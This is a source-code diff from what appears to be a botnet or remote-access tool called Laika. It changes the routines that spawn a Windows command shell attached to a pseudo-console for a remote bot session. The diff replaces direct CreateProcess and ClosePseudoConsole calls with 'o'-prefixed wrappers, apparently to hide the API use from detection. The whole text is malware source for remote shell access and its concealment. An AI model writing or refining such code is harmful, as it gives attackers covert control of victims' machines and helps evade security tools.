@@ -24,7 +24,7 @@ HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo
 
 struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int rows, uint32_t id)
 {
-    TCHAR szComspec[MAX_PATH];
+    CHAR szComspec[MAX_PATH];
     struct sLaika_RAWshell *shell =
         (struct sLaika_RAWshell *)laikaM_malloc(sizeof(struct sLaika_RAWshell));
     HRESULT hr;
@@ -40,7 +40,7 @@ struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int ro
     }
 
     /* get user's shell path */
-    if (GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) == 0) {
+    if (GetEnvironmentVariableA("COMSPEC", szComspec, MAX_PATH) == 0) {
         laikaM_free(shell);
         return NULL;
     }
@@ -48,14 +48,14 @@ struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int ro
     /* create process */
     hr = InitializeStartupInfoAttachedToPseudoConsole(&shell->startupInfo, shell->pseudoCon);
     if (hr != S_OK) {
-        ClosePseudoConsole(shell->pseudoCon);
+        oClosePseudoConsole(shell->pseudoCon);
 
         laikaM_free(shell);
         return NULL;
     }
 
     /* launch cmd shell */
-    hr = CreateProcess(NULL,                            /* No module name - use Command Line */
+    hr = oCreateProcessA(NULL,                            /* No module name - use Command Line */
                        szComspec,                       /* Command Line */
                        NULL,                            /* Process handle not inheritable */
                        NULL,                            /* Thread handle not inheritable */
@@ -72,7 +72,7 @@ struct sLaika_shell *laikaB_newRAWShell(struct sLaika_bot *bot, int cols, int ro
         DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
         laikaM_free(shell->startupInfo.lpAttributeList);
 
-        ClosePseudoConsole(shell->pseudoCon);
+        oClosePseudoConsole(shell->pseudoCon);
 
         laikaM_free(shell);
         return NULL;
@@ -97,7 +97,7 @@ void laikaB_freeRAWShell(struct sLaika_bot *bot, struct sLaika_shell *_shell)
     laikaM_free(shell->startupInfo.lpAttributeList);
 
     /* close pseudo console */
-    ClosePseudoConsole(shell->pseudoCon);
+    oClosePseudoConsole(shell->pseudoCon);
 
     /* free shell struct */
     laikaM_free(shell);
